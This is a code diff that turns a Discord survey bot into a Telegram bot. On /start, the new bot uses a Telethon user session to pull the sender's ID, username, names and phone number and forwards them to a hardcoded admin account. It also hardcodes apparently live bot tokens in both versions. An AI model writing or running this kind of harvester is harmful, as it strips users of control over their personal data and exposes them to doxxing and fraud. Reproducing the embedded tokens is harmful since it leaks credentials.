@@ -1,47 +1,68 @@
-import discord
-from discord.ext import commands
+from telethon import TelegramClient
+from telegram import Update
+from telegram.ext import Updater, CommandHandler, CallbackContext
+import logging
 
-# Intents allow the bot to interact with users' messages and other events
-intents = discord.Intents.default()
-intents.message_content = True
+# Telegram API credentials for Telethon
+api_id = 'YOUR_API_ID'
+api_hash = 'YOUR_API_HASH'
+phone_number = 'YOUR_PHONE_NUMBER'
 
-# Define the bot with command prefix
-bot = commands.Bot(command_prefix="!", intents=intents)
+# Admin user ID to whom we send the data (replace with actual admin's Telegram ID)
+admin_id = '6135948216'
 
-# Create a dictionary to store user data
-user_data = {}
+# Create a Telethon client for accessing user data
+client = TelegramClient('session_name', api_id, api_hash)
 
-# This function will handle the command that starts the data collection
-@bot.command()
-async def start(ctx):
-    await ctx.send("Welcome to the data collection bot! Let's start by collecting some basic information.")
-    await ctx.send("Please provide your name:")
+# Set up logging for the bot
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+                    level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# This will handle the user's response and store it
-@bot.command()
-async def collect(ctx, *, answer: str):
-    user_id = ctx.author.id
+async def get_user_data(user_id):
+    """Collect user data using Telethon."""
+    user = await client.get_entity(user_id)
+    user_data = {
+        'User ID': user.id,
+        'Username': user.username,
+        'First Name': user.first_name,
+        'Last Name': user.last_name,
+        'Phone Number': user.phone,
+    }
+    return user_data
 
-    # Create a new entry for the user if it does not exist
-    if user_id not in user_data:
-        user_data[user_id] = {}
+def start(update: Update, context: CallbackContext):
+    """Handle /start command from the user in the bot."""
+    user_id = update.message.from_user.id
+    user_name = update.message.from_user.full_name
 
-    # Store the user's data
-    if "name" not in user_data[user_id]:
-        user_data[user_id]["name"] = answer
-        await ctx.send(f"Got your name: {answer}. What is your age?")
-    elif "age" not in user_data[user_id]:
-        user_data[user_id]["age"] = answer
-        await ctx.send(f"Got your age: {answer}. What's your favorite color?")
-    elif "color" not in user_data[user_id]:
-        user_data[user_id]["color"] = answer
-        await ctx.send(f"Got your favorite color: {answer}. Thank you for participating!")
-        await ctx.send("Your data has been collected successfully!")
+    # Send a welcome message to the user
+    update.message.reply_text(f"Hello {user_name}, your data is being collected!")
 
-# This is an event that runs when the bot starts up
-@bot.event
-async def on_ready():
-    print(f'Bot is logged in as {bot.user}')
+    # Collect user data using Telethon
+    user_data = client.loop.run_until_complete(get_user_data(user_id))
 
-# Run the bot with the token
-bot.run('8009823215:AAFyzYFIvjvMTvS1454tJ1kp3kGh72TtgZY')
+    # Prepare the data to send to the admin
+    user_data_str = "\n".join([f"{key}: {value}" for key, value in user_data.items()])
+
+    # Send collected user data to the admin
+    context.bot.send_message(chat_id=admin_id, text=f"User Data:\n{user_data_str}")
+
+def main():
+    """Start the Telegram Bot."""
+    # Start the Telethon client
+    client.start(phone_number)
+
+    # Create the bot updater and dispatcher
+    updater = Updater('7735159098:AAHB_Gb97ItiyiYqf2FEAnQeZYaAH6pntBI', use_context=True)
+
+    # Register the /start command handler
+    updater.dispatcher.add_handler(CommandHandler('start', start))
+
+    # Start the bot
+    updater.start_polling()
+    updater.idle()
+
+# Run the main function to start the bot and Telethon client
+if __name__ == '__main__':
+    main()
